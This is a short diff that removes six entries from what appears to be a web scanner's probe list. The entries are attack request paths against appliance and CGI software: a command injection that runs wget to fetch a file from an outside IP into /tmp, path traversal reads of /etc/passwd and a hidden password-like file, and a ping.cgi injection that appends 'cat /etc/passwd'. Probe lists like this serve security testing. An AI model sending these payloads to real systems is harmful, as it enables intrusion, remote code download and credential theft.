@@ -1,6 +1,0 @@
-10	/appliancews/getLicense?hostName=$(/usr/bin/wget%20http://1.1.1.1:12345/file%20-O%20/tmp/dsifnfnfdwsFFS)
-20	/html/en/confAccessProt.html
-30	/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../etc/passwd%00&Action=blast&hidenav=1
-40	/cgi-bin/dna/viewAppletFsa.cgi?seqID=../../../../home/dna/spool/.pfile
-50	/ossim/pcap/download.php?scan_name=pass&sensor_ip=1.1.1.1
-60	/ping.cgi?IPAddr1=12&IPAddr3=12&IPAddr2=12&ping=Ping&IPAddr4=12&ping_IPAddr=12.12.12.12%3B+cat%20/etc/passwd
